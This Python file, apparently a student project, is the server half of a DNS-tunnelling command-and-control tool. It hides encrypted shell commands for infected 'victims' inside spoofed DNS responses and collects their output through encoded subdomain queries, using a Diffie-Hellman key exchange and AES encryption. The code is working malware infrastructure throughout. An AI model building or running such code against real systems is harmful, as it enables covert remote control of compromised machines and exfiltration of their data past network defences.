"""
Shachar Markovich 211491766
Naor Maman        207341777
"""
import binascii
import base64
from threading import Thread

import pyDH as pyDH
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

TYPES = {'A': 1, 'AAAA': 28, 'CNAME': 5, 'TXT': 16}
DOMAIN = b".resh.gimel."
MAX_CHARS_IN_SUBDOMAIN = 63
FORWARD_IP = '8.8.8.8'
MAX_DOMAIN = 255 - len(DOMAIN) - 10
CLIENT_COMMANDS = {'keyExchange1': 101, 'keyExchange3': 103, 'ok&ans': 201, 'awake': 300, 'ok&retransmission': 401,
                   'more': 501, 'next': 502, 'last': 503, 'ok&continue': 504}
SERVER_COMMANDS = {'keyExchange2': 102, 'ok&process': 200, 'ok&sleep': 301, 'error&retransmission': 400,
                   'more': 501, 'next': 502, 'last': 503, 'ok&continue': 504}
stat_data = b''
stat_code = 0
connected_victims = {}  # keys: identifies victims' numbers. values: to each: [shared key, os type]
need_2_send: List[bytes] = []
input_buffer = ""


def cipher_obj(key: bytes):
    """
    Creating an AES cipher block for encrypting & decrypting.
    The cipher object is working only once - so we recreating it every encrypting/decrypting.

    :param key: the encrypting-decrypting shared key.
    :returns: AES cipher block for encrypting/decrypting.
    """
    return AES.new(key[:32], AES.MODE_CBC, iv=key[33:49])


def listen_socket():
    """
    this machine is the DNS nameserver,
    therefore, it's NOT listen in Known-DNS-port 53,
    so we open a socket in this port, in order to avoid the machine to send a ICMP port-unreachable
    :returns: UDP server listen socket
    """
    dns_udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_udp_socket.bind(('', 53))
    return dns_udp_socket


def attack(request: DNSQR):
    """
    Get a DNS request from victim with fake request that contains some data.
    parse the data, and act according to it.
    :param request: the DNS request query from victim.
    """
    global stat_code
    global stat_data

    parse = parse_request(request[DNSQR])
    identify: bytes = parse[0]
    cmd_code: int = parse[1]
    enc_data: bytes = parse[-1]

    # send an error msg if the RR is unsupported
    if request[DNS].qd.qtype not in TYPES.values():
        err_ans = build_response(identify, CLIENT_COMMANDS['error&retransmission'], b'Unsupported RR type')
        send_response(request, err_ans)

    elif cmd_code in [CLIENT_COMMANDS['ok&ans'], CLIENT_COMMANDS['ok&retransmission']]:
        print('ok&ans OR ok&retransmission')
        send_command(request, identify, cmd_code, enc_data)

    elif cmd_code == CLIENT_COMMANDS['more']:
        print('more')
        get_first_part(request, identify, enc_data)

    elif cmd_code == CLIENT_COMMANDS['next']:
        print('next')
        get_next_part(request, identify, enc_data)

    elif cmd_code == CLIENT_COMMANDS['last']:
        global stat_data
        global stat_code

        if stat_code == CLIENT_COMMANDS['keyExchange1']:
            print('keyExchange1')
            bytes_victim_dh_pubkey = base64.b32decode(stat_data + enc_data)
            key_exchange1(request, identify, bytes_victim_dh_pubkey)

        else:
            print('last part')
            try:
                print('[!] stat_data + enc_data:\n', stat_data + enc_data)
                data = decode_msg(identify, stat_data + enc_data)
            except binascii.Error:
                err_ans = build_response(identify, SERVER_COMMANDS['error&retransmission'], b'wrong code - no last')
                send_response(request, err_ans)
            else:
                print('identify:', identify, ' | code:', stat_code, ' | all data:\n', data)
                response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'5')
                send_response(request, response_data)
                # input("Enter next command to be sent to client: ")

        stat_data = b''
        stat_code = 0

    elif cmd_code == CLIENT_COMMANDS['keyExchange3']:
        print('keyExchange3')
        key_exchange3(request, identify, enc_data)

    elif cmd_code == CLIENT_COMMANDS['ok&continue'] and need_2_send:
        # send the other parts of the data, if the victim says that he is ready to accept it,
        # and if we have something more to send
        send_next_part(request, identify)

    elif cmd_code == CLIENT_COMMANDS['awake']:
        print('victim awake')
        send_next_command(request, identify)


# region protocol parts functions
def send_command(request: DNSQR, identify: bytes, ans_code: int, enc_data: bytes):
    """
    Send the next command to the victim
    :param request: the DNS request query from victim.
    :param identify: victim identify number
    :param ans_code: victim client code
    :param enc_data: victim encoded data
    """
    global input_buffer
    data = decode_msg(identify, enc_data)
    # print('answer from ', identify, ' with code ', ans_code, ':\n', data)
    print(data)
    send_next_command(request, identify)


def send_next_part(request: DNSQR, identify: bytes):
    """
    Pop from the waiting list the server command's next part and send it to victim in a DNS response message.
    :param request: the DNS request query from victim.
    :param identify: victim identify number
    """
    rdata = need_2_send.pop(0)  # pop the next part from the whole server command
    # build a DNS response and send it
    response = IP(dst=request[IP].src) / UDP(sport=53, dport=request[UDP].sport) / DNS(id=request[DNS].id,
                                                                                       ancount=1, qr=1, rd=1,
                                                                                       qd=request[DNSQR])
    response[DNS].an = DNSRR(rrname=request[DNSQR].qname, type=request[DNSQR].qtype, rdata=rdata)
    send(response, verbose=False)


def get_first_part(request: DNSQR, identify: bytes, enc_data: bytes):
    """
    Get the first part of answer from victim,
    and send him an `ACK` that says that he can send the next part.
    :param request: the DNS request query from victim.
    :param identify:
    :param enc_data: victim encoded data
    """
    global stat_code
    global stat_data
    stat_code = int(base64.b32decode(enc_data[:8]).decode())
    stat_data = enc_data[8:]
    response_data = build_response(identify, SERVER_COMMANDS['ok&continue'], b'next')
    send_response(request, response_data)


def get_next_part(request: DNSQR, identify: bytes, enc_data: bytes):
    """
    Get the next part of answer from victim,
    and send him an `ACK` that says that he can send the next part.
    :param request: the DNS request query from victim.
    :param identify:
    :param enc_data: victim encoded data
    """
    global stat_data
    stat_data += enc_data
    response_data = build_response(identify, SERVER_COMMANDS['ok&continue'], b'next')
    send_response(request, response_data)


# region key exchanging functions:

def key_exchange1(request: DNSQR, identify: bytes, bytes_victim_dh_pubkey: bytes):
    """
    Start key exchanging with the connected victim:
    generate the public & shared key, encrypting & decrypting functions.
    send the public key to victim.
    :param request: the DNSQR paket from victim
    :param identify: victim identify number
    :param bytes_victim_dh_pubkey: victim public key
    """
    victim_dh_pubkey: int = int.from_bytes(bytes_victim_dh_pubkey, 'little')
    dh = pyDH.DiffieHellman()
    pubkey: int = dh.gen_public_key()
    shared_key: bytes = dh.gen_shared_key(victim_dh_pubkey).encode()

    server_pubkey_response = build_response(identify, SERVER_COMMANDS['keyExchange2'], pubkey.to_bytes(256, 'little'))
    send_response(request, server_pubkey_response)

    connected_victims[identify] = [shared_key]


def key_exchange3(request: DNSQR, identify: bytes, enc_victim_os: bytes):
    """
    Finish key exchanging with the connected victim:
    save the victim os type,
    send him the next command to do.
    :param request: the DNSQR paket from victim
    :param identify: victim identify number
    :param enc_victim_os: victim os type
    """
    victim_os = decode_msg(identify, enc_victim_os)

    connected_victims[identify].append(victim_os)
    print("[!] New victim is connected!")

    print(f"[!] {identify} OS type: {connected_victims[identify][-1]}")
    send_next_command(request, identify)


# endregion

def send_next_command(request: DNSQR, identify: bytes):
    """
    :param request: the DNSQR paket from victim
    :param identify: victim identify number
    """
    # global input_buffer
    #
    # if input_buffer != '':
    #     response_data = build_response(identify, SERVER_COMMANDS['ok&process'], input_buffer.encode())
    #     input_buffer = ''
    # else:
    #     print("[!]send him to sleep!")
    #     response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'5')
    # send_response(request, response_data)
    print('send `ip a`')
    response_data = build_response(identify, SERVER_COMMANDS['ok&process'], b'ip a')
    send_response(request, response_data)


# endregion

# region send & receive functions:


def build_response(identify: bytes, cmd_code: int, cmd: bytes):
    """
    Build the next command for the victim.
    :param identify:
    :param cmd_code: the command code.
    :param cmd: the next command.
    :return: an encrypted answer, encoded in base 32
    """
    if identify in connected_victims:
        # we encrypt the msg iff we already exchanged the key and we have the decrypting object
        aes_encrypting = cipher_obj(connected_victims[identify][0])
        encrypted_msg = aes_encrypting.encrypt(pad(cmd, AES.block_size))
        base32_msg = base64.b32encode(encrypted_msg)
    else:
        base32_msg = base64.b32encode(cmd)
    # base32_msg = base64.b32encode(cmd)

    # check if the length of the message is more than 63 allowed chars between 2 dots:
    max_chars = MAX_CHARS_IN_SUBDOMAIN
    if len(base32_msg) > max_chars:
        # add a dot between every 63 chars
        i = max_chars
        while i < len(base32_msg):
            base32_msg = base32_msg[:i] + b'.' + base32_msg[i:]
            i += max_chars

    return base64.b32encode(str(cmd_code).encode()) + b'.' + base32_msg


def send_response(request: DNSQR, fake_domain: bytes):
    """
    Send a DNS response.
    The data in the response is `fake_domain`.
    :param request: the sniffed DNS request
    :param fake_domain: the data to send to victim
    """
    response = IP(dst=request[IP].src) / UDP(sport=53, dport=request[UDP].sport) / DNS(id=request[DNS].id,
                                                                                       ancount=1, qr=1, rd=1,
                                                                                       qd=request[DNSQR])
    if len(fake_domain) > MAX_DOMAIN:
        # send first part, the others add to list
        cmd_code = base64.b32encode(str(SERVER_COMMANDS['more']).encode()) + b'.'
        max_size = MAX_DOMAIN - len(cmd_code)
        i = 0
        rdata = cmd_code + fake_domain[i:i + max_size] + DOMAIN
        ans = DNSRR(rrname=request[DNSQR].qname, type=request[DNSQR].qtype, rdata=rdata)
        response[DNS].an = ans
        send(response, verbose=False)

        i += max_size
        next_code = base64.b32encode(str(SERVER_COMMANDS['next']).encode()) + b'.'
        while i + max_size < len(fake_domain):
            rdata = next_code + fake_domain[i:i + max_size] + DOMAIN
            need_2_send.append(rdata)
            i += max_size
        last_code = base64.b32encode(str(SERVER_COMMANDS['last']).encode()) + b'.'
        rdata = last_code + fake_domain[i:i + max_size] + DOMAIN
        need_2_send.append(rdata)

    else:
        answer = DNSRR(rrname=request[DNSQR].qname, rdata=fake_domain + DOMAIN, type=request[DNSQR].qtype)
        response[DNS].an = answer
        send(response, verbose=False)


def parse_request(request: DNSQR):
    """
    Parse from a given DNS `fake` request the identify of the victim, the data in base32 and it's code.
    :param request: a DNS request header.
    :return: the identify of the victim, data's code and the data itself
    """
    # qname format:
    # identify.base32(code).base32(data).resh.gimel.
    qname = request[DNSQR].qname
    # decode identify and answer code parts:
    # the data will stay encoded because maybe it's part from bigger message.
    identify, ans_code, enc_data = qname.split(b'.', 2)
    cmd_code = base64.b32decode(ans_code).decode()
    # remove the domain from end of victim answer:
    enc_data = enc_data[:-len(DOMAIN)].replace(b'.', b'')

    try:
        return identify, int(cmd_code), enc_data
    except ValueError:
        return identify, SERVER_COMMANDS['error&retransmission'], "error in code type"


# endregion

# region sniffing functions
def prn(pkt):
    """
    process MiTM only for `url`, for others DNS request - forwarding the request to a real DNS server
    :param pkt: the DNS request packet from the victim DNS nameserver
    """
    qname = pkt[DNSQR].qname

    if DOMAIN in qname:
        if b'_' in qname:
            # print("[!] underscore (_) in domain!")
            response = IP(dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport)
            response /= DNS(id=pkt[DNS].id, ancount=1, qr=1, rd=1, qd=pkt[DNSQR],
                            an=DNSRR(rrname=pkt[DNSQR].qname, rdata='ns.resh.gimel.', type='NS'))
            send(response, verbose=False)
        elif b'ns' in qname:
            # print("[!] NS in domain!")
            if pkt[DNSQR].qtype == TYPES['A']:
                response = IP(dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport)
                response /= DNS(id=pkt[DNS].id, ancount=1, qr=1, rd=1, qd=pkt[DNSQR],
                                an=DNSRR(rrname=pkt[DNSQR].qname, rdata='96.69.96.69', type='A'))
                send(response, verbose=False)

            elif pkt[DNSQR].qtype == TYPES['AAAA']:
                response = IP(dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport)
                response /= DNS(id=pkt[DNS].id, ancount=1, qr=1, rd=1, qd=pkt[DNSQR],
                                an=DNSRR(rrname=pkt[DNSQR].qname, rdata='2001:4860:4802:32::78', type='AAAA'))
                send(response, verbose=False)
        else:
            attack(pkt)


def dns_request_filter(pkt) -> bool:
    """
    Filter only DNS request.
    :param pkt: the sniffed packet.
    :returns: if it mean the condition above.
    """
    return DNS in pkt and DNSRR not in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0


def run():
    """
    run the DNS Spoof attack
    """
    listen_sock = listen_socket()

    try:
        print("[!] Waiting to victims...")
        sniff(lfilter=dns_request_filter, prn=prn)
    except KeyboardInterrupt:
        print("[!] A keyboard interrupt has been detected.")
        print("[!] Finish attack.")
        listen_sock.close()


# endregion


def decode_msg(identify, encrypted_msg: bytes) -> str:
    """
    Get an encrypted message from server and decrypt it.
    :param identify: victim identify number
    :param encrypted_msg: the encrypted message
    :return: plain text message
    """

    base32_msg = base64.b32decode(encrypted_msg)  # decode the response
    print(identify, connected_victims[identify])
    if identify in connected_victims:
        # we decrypt the msg iff we already exchanged the key and we have the decrypting object
        decrypting = cipher_obj(connected_victims[identify][0])
        return unpad(decrypting.decrypt(base32_msg), AES.block_size).decode()
    else:
        return base32_msg.decode()


def main():
    run()


if __name__ == "__main__":
    main()
